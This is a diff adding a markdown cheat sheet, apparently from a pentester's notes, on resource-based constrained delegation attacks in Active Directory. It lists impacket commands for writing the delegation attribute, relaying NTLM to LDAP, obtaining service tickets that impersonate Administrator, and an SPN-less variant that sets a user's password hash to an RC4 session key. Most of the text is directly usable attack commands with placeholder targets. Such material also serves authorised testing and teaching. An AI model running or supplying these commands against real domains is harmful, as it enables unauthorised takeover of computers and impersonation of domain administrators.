@@ -1,0 +1,52 @@
+---
+syntax: markdown
+---
+# Resource-Based Constrained Delegation
+
+Take over a computer account when being able to write its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
+Allows impersonating users via Kerberos delegation on the target system.
+
+Regularly, an account with an SPN is required for delegation, but a variant utilizing an SPN-less user account exists.
+
+
+## Regular attack
+
+- directly set the attribute when attacker has control over an account with write permission
+    rbcd.py 'FQDN/ATTACKERUSER:PW' -delegate-to 'TARGETCOMPUTER$' -delegate-from 'ATTACKERCOMPUTER$' -action write
+
+- or alternatively, set the attribute via relaying since the target computer can write its own attribute
+    ntlmrelayx.py -t ldap://DC --no-acl --no-validate-privs --delegate-access --escalate-user 'ATTACKERCOMPUTER$'
+
+- get service ticket for impersonation
+    getST.py 'FQDN/ATTACKERCOMPUTER$:PW' -spn 'HOST/TARGETCOMPUTER.FQDN' -impersonate Administrator
+
+- use the service ticket to compromise the system
+
+- clean up the attribute, e.g. via `rbcd.py`
+
+
+## Attack with SPN-less user
+
+Via User-to-User (U2U) it is possible to obtain a service ticket for an UPN instead of an SPN.
+The KDC will try to decrypt the service ticket in the S4U2Proxy request with the user's long-term key but in case of U2U it is encrypted with the session key.
+Therefore, the password hash of the user needs to be set to the RC4 ticket session key so both are the same.
+
+Requires RC4 being supported as a Kerberos encryption type (only then the lengths of session key and password hash match).
+Can only restore the user's password when there is no `minPwdAge` set in the password policy.
+
+- set the attribute like in the regular attack but configure an SPN-less ATTACKERUSER account for delegation
+
+- get a TGT but use hashes for preauth to force RC4 encryption type
+    getTGT.py -hashes :$(pypykatz crypto nt ATTACKERPW) FQDN/ATTACKERUSER
+
+- set the password hash to the ticket session key
+    describeTicket.py ATTACKERUSER.ccache | grep 'Ticket Session Key'
+    changepasswd.py FQDN/ATTACKERUSER:PW@DC -newhashes :SESSIONKEY
+
+- get service ticket with U2U for impersonation
+    KRB5CCNAME=ATTACKERUSER.ccache getST.py FQDN/ATTACKERUSER -k -no-pass -u2u -spn 'HOST/TARGETCOMPUTER.FQDN' -impersonate Administrator
+
+- restore the password when there is no `minPwdAge` set in the password policy
+    changepasswd.py FQDN/ATTACKERUSER@DC -hashes :SESSIONKEY -newpass PW -protocol kpasswd
+
+- use the service ticket to compromise the system and clean up the attribute like in the regular attack
